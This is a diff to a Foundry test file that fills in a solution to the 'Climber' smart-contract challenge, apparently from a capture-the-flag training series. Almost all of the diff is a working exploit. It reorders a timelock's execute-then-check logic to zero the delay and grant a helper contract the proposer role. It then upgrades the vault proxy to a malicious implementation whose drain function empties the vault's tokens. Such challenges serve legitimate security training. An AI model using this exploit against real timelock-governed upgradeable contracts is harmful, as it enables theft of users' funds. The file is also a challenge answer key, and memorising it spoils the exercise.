@@ -85,7 +85,34 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        VulnerableUpgrade vulnerableUpgrade = new VulnerableUpgrade();
+        Scheduler scheduler = new Scheduler(timelock);
+
+        bytes32 salt;
+        uint64 newDelay = 0;
+        uint256 amount = token.balanceOf(address(vault));
+        bytes memory encodedCall = abi.encodeCall(vulnerableUpgrade.drain, (address(token), recovery, amount));
+
+        address[] memory targets = new address[](4);
+        targets[0] = address(timelock);
+        targets[1] = address(timelock);
+        targets[2] = address(scheduler);
+        targets[3] = address(vault);
+
+        uint256[] memory values = new uint256[](4);
+        values[0] = 0;
+        values[1] = 0;
+        values[2] = 0;
+        values[3] = 0;
+
+        bytes[] memory dataElements = new bytes[](4);
+        dataElements[0] = abi.encodeCall(timelock.updateDelay, (newDelay));
+        dataElements[1] = abi.encodeCall(timelock.grantRole, (PROPOSER_ROLE, address(scheduler)));
+        dataElements[2] = abi.encodeCall(scheduler.schedule, ());
+        dataElements[3] = abi.encodeCall(vault.upgradeToAndCall, (address(vulnerableUpgrade), encodedCall));
+
+        scheduler.setUp(targets, values, dataElements, salt);
+        timelock.execute(targets, values, dataElements, salt);
     }
 
     /**
@@ -94,5 +121,45 @@ contract ClimberChallenge is Test {
     function _isSolved() private view {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
         assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+    }
+}
+
+/*//////////////////////////////////////////////////////////////
+                            SOLUTION
+//////////////////////////////////////////////////////////////*/
+
+import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
+
+contract VulnerableUpgrade is UUPSUpgradeable {
+    function drain(address token, address receiver, uint256 amount) public {
+        IERC20(token).transfer(receiver, amount);
+    }
+
+    function _authorizeUpgrade(address newImplementation) internal override {}
+}
+
+contract Scheduler {
+    ClimberTimelock timelock;
+    address[] targets;
+    uint256[] values;
+    bytes[] dataElements;
+    bytes32 salt;
+
+    constructor(ClimberTimelock timelock_) {
+        timelock = timelock_;
+    }
+
+    function setUp(address[] memory targets_, uint256[] memory values_, bytes[] memory dataElements_, bytes32 salt_)
+        public
+    {
+        targets = targets_;
+        values = values_;
+        dataElements = dataElements_;
+        salt = salt_;
+    }
+
+    function schedule() public {
+        timelock.schedule(targets, values, dataElements, salt);
     }
 }
